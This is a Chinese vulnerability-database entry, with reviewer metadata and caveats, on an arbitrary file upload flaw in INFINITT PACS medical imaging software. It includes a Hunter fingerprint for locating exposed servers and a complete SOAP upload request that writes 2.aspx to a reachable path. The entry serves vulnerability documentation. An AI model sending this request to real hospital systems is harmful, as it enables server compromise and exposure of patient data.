---
source: "wy876 漏洞文库"
title: "INFINITT PACS英飞达 WebJobUpload jobUpload任意文件上传"
product: "INFINITT PACS英飞达"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，SOAP及上传目录权限"
prerequisites: "未说明，vcode=1含义未知"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/wu6h6bbwq3zx751r"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E8%8B%B1%E9%A3%9E%E8%BE%BE/%E8%8B%B1%E9%A3%9E%E8%BE%BE%E5%BD%B1%E5%83%8F%E5%AD%98%E6%A1%A3%E4%B8%8E%E9%80%9A%E8%AE%AF%28PACS%29%E7%B3%BB%E7%BB%9FINFINITTPACSWebJobUpload%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "web.icon="
hunter: "web.icon=\"0cd46e0cba3abd067cd28e70eb7f2a5f\""
id: "vw-1c9289e24e04808d776e5b97"
entity_id: "ve-1c9289e24e04808d776e5b97"
schema_version: "1"
---

# INFINITT PACS英飞达 WebJobUpload jobUpload任意文件上传

## 条目说明

- 对象与具体问题：INFINITT PACS英飞达；WebJobUpload jobUpload任意文件上传
- 版本、配置及部署条件：版本未知，SOAP及上传目录权限
- 认证与权限前提：未说明，vcode=1含义未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- Base64 MTIz为123纯文本，只能试上传，不能证明ASPX代码执行/病人数据泄露
- Content-Length字面length不可用；固定/1/2.aspx路径无返回支持
- vcode是否授权/租户验证需说明；Hunter错入fofa，厂商市场排名宣传无时间来源
- 目录英飞达与英飞达PACS分裂，统一产品

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
英飞达是一家专业开发医学影像系统的公司，成立于1994年，早年PACS产品双子星：EFILM和PiviewSTAR，其中PiviewSTAR为我公司产品。2011年于KOSDAQ上市。产品覆盖放射、超声、内镜、病理、电生理、放疗等所有检查医技科室，生态支持单院区、多院区、区域、医联体、集团化、移动端、云端、互联网应用。客户数量多，全球6000多客户的选择，美国中小医院KLAS排第一，台湾前二，日本前三，另有德国，英国，中东，巴西，东南亚等多个地区设有分公司。中国三甲医院数量前三，西南、西北区优质客户数量第一。INFINITT PACS WebJobUpload接口存在任意文件上传漏洞 ，攻击者可通过该漏洞获取服务器权限，严重甚至导致医院的敏感病人数据泄露。

## 二、影响版本
+ 英飞达影像存档与通讯(PACS)系统INFINITT PACS

## 三、资产测绘
+ hunter`web.icon="0cd46e0cba3abd067cd28e70eb7f2a5f"`
+ 特征


## 四、漏洞复现
```http
POST /webservices/WebJobUpload.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://rainier/jobUpload"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<jobUpload xmlns="http://rainier">
<vcode>1</vcode>
<subFolder></subFolder>
<fileName>2.aspx</fileName>
<bufValue>MTIz</bufValue>
</jobUpload>
</soap:Body>
</soap:Envelope>
```

> 请求长度说明：原资料 Content-Length 为 length；静态长度已移除，应由客户端根据最终请求体的字节数生成。


```plain
/1/2.aspx
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/wu6h6bbwq3zx751r>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
